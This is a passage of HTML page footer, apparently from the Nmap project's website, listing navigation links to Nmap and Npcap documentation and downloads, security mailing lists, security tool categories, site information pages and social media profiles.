<li><a class="nlink" href="https://nmap.org/book/install.html">Install Guide</a>
<li><a class="nlink" href="https://nmap.org/docs.html">Docs</a>
<li><a class="nlink" href="https://nmap.org/download.html">Download</a>
<li><a class="nlink" href="https://nmap.org/oem/">Nmap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://npcap.com/">Npcap packet capture</a></h2>
<ul>
<li><a class="nlink" href="https://npcap.com/guide/">User's Guide</a>
<li><a class="nlink" href="https://npcap.com/guide/npcap-devguide.html#npcap-api">API docs</a>
<li><a class="nlink" href="https://npcap.com/#download">Download</a>
<li><a class="nlink" href="https://npcap.com/oem/">Npcap OEM</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://seclists.org/">Security Lists</a></h2>
<ul>
<li><a class="nlink" href="https://seclists.org/nmap-announce/">Nmap Announce</a>
<li><a class="nlink" href="https://seclists.org/nmap-dev/">Nmap Dev</a>
<li><a class="nlink" href="https://seclists.org/fulldisclosure/">Full Disclosure</a>
<li><a class="nlink" href="https://seclists.org/oss-sec/">Open Source Security</a>
<li><a class="nlink" href="https://seclists.org/dataloss/">BreachExchange</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://sectools.org">Security Tools</a></h2>
<ul>
<li><a class="nlink" href="https://sectools.org/tag/vuln-scanners/">Vuln scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/pass-audit/">Password audit</a>
<li><a class="nlink" href="https://sectools.org/tag/web-scanners/">Web scanners</a>
<li><a class="nlink" href="https://sectools.org/tag/wireless/">Wireless</a>
<li><a class="nlink" href="https://sectools.org/tag/sploits/">Exploitation</a>
</ul>
</div>
<div class="fl-unit">
<h2><a class="nlink" href="https://insecure.org/">About</a></h2>
<ul>
<li><a class="nlink" href="https://insecure.org/fyodor/">About/Contact</a>
<li><a class="nlink" href="https://insecure.org/privacy.html">Privacy</a>
<li><a class="nlink" href="https://insecure.org/advertising.html">Advertising</a>
<li><a class="nlink" href="https://nmap.org/npsl/">Nmap Public Source License</a>
</ul>
</div>
<div class="fl-unit social-links">
<a class="nlink" href="https://twitter.com/nmap" title="Visit us on Twitter">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#twitter" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://facebook.com/nmap" title="Visit us on Facebook">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#facebook" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://github.com/nmap/" title="Visit us on Github">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#github" alt="" aria-hidden="true">
 </a>
<a class="nlink" href="https://reddit.com/r/nmap/" title="Discuss Nmap on Reddit">
 <img width="32" height="32" src="/shared/images/nst-icons.svg#reddit" alt="" aria-hidden="true">
 </a>
</div>
</div>
</footer>

</div><!-- wrapper -->
</body>
</html>

